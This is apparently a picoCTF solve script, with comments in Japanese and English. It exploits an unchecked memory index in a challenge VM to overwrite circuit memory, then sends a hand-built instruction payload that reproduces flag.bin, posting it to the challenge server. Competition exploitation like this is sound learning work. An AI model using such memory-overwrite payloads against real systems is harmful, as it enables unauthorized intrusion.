import json

import requests

from utils import *


def solve():
    """
    flag.binの内容を実行するとフラグが得られる
    {
        "input1":0x6f73,
        "input2":0x6563,
        "output":0x2e69
    }
    みたいにするとmemory[0x2000+0x6f73*2]を取ってこようとしてきてエラーになるので仕方なく
    reg=0
    for i in range(4):
        reg+=value&(0xf000>>(i*4))
        reg<<=4
    をしている
    これrev+pwn定期(cpu.jsonほしかったです、あとflag.binを実行したらフラグゲットできるよ～とか書いてほしかった)
    """
    """
    English
    We can execute the content of flag.bin to get the flag
    Clearly, we can access/write memory[0x3000], which is circuit data, by passing (0x3000-0x2000)//2
    By using this, we can rewrite any memory, which leads execution of content of flag.bin
    However, if I send the content of flag.bin directly, there are some errors that vm cannot access memories, for example memory[0x2000+0x6f73*2].
    So, I changed the code that does not cause these errors but do the same thing as flag.bin
    
    why there is no cpu.json!
    """
    d=Encoder()
    addr=0x72
    values=[0x6f73,0x6563,0x2e69,0x6f00]
    for i in range(len(values)):
        d.add(addr,(i<<4)|0xd)
        d.add(addr+2,0)
        d.add(addr+4,(i<<4)|0x4|(((values[i]&0xf000)>>12)<<8))
        d.add(addr + 6, (i << 8) | (i << 4)|0x1)
        d.add(addr + 8, (i << 8) | (i << 4) | 0x1)
        d.add(addr + 10, (i << 8) | (i << 4) | 0x1)
        d.add(addr + 12, (i << 8) | (i << 4) | 0x1)
        d.add(addr + 14,(i<<4)|0x4|(((values[i]&0xf00)>>8)<<8))
        d.add(addr + 16, (i << 8) | (i << 4) | 0x1)
        d.add(addr + 18, (i << 8) | (i << 4) | 0x1)
        d.add(addr + 20, (i << 8) | (i << 4) | 0x1)
        d.add(addr + 22, (i << 8) | (i << 4) | 0x1)
        d.add(addr + 24, (i << 4) | 0x4 | (((values[i] & 0xf0) >> 4) << 8))
        d.add(addr + 26, (i << 8) | (i << 4) | 0x1)
        d.add(addr + 28, (i << 8) | (i << 4) | 0x1)
        d.add(addr + 30, (i << 8) | (i << 4) | 0x1)
        d.add(addr + 32, (i << 8) | (i << 4) | 0x1)
        d.add(addr + 34, (i << 4) | 0x4 | (((values[i] & 0xf) >> 0) << 8))
        addr+=36
    d.add(addr,0xe) #flag?
    data=d.encode()
    j = json.dumps(data)
    res = requests.post("http://activist-birds.picoctf.net:59104/check", data=j,
                        headers={"Content-Type": "application/json"})
    print(res.text)

solve()